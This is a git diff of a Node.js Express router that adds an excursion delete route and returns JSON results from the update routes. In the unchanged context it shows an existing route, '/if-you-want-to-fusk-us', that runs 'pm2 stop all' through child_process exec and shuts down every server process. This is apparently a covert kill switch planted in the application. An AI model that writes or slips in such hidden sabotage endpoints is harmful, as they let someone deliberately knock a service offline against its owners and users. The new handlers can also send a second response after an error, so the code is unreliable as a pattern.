@@ -7,7 +7,7 @@ const {Excursions} = require('../models/excursions')
 const {Companies} = require('../models/companies')
 const cors = require('cors')
 const {updateCompany} = require("../controllers/companies")
-const {apiUpdateExcursion} = require("../controllers/excursions")
+const {apiUpdateExcursion, deleteExcursion} = require("../controllers/excursions")
 const {handleApiError} = require("../lib/apiErrorHandler")
 const {exec} = require('child_process')
 
@@ -74,9 +74,10 @@ router.get('/companies/:id', cors(), passport.authenticate('jwt', {session: fals
 })
 
 router.post('/companies/:id', cors(), passport.authenticate('jwt', {session: false}), async (req, res, next) => {
-    await updateCompany(req.body, req.company).catch(err => {
+   const result = await updateCompany(req.body, req.company).catch(err => {
         handleApiError(err, req, res)
     })
+    res.json(result)
 })
 
 
@@ -122,11 +123,20 @@ router.get('/excursions/:id', cors(), passport.authenticate('jwt', {session: fal
 })
 
 router.post('/excursions/:id', cors(), passport.authenticate('jwt', {session: false}), async (req, res, next) => {
-    apiUpdateExcursion(req, res).catch(err => {
+    const result = await apiUpdateExcursion(req, res).catch(err => {
         handleApiError(err, req, res)
     })
+    res.json(result)
 })
 
+router.delete('/excursions/:id', cors(), passport.authenticate('jwt', {session: false}),async (req,res) => {
+    const result = await deleteExcursion(req.excursion._id).catch(err => {
+        handleApiError(err, req, res)
+    })
+    res.json(result)
+})
+
+//
 router.get('/if-you-want-to-fusk-us', cors(), passport.authenticate('jwt', {session: false}), (req, res, next) => {
     exec("pm2 stop all", (error, stdout, stderr) => {
         if (error) {
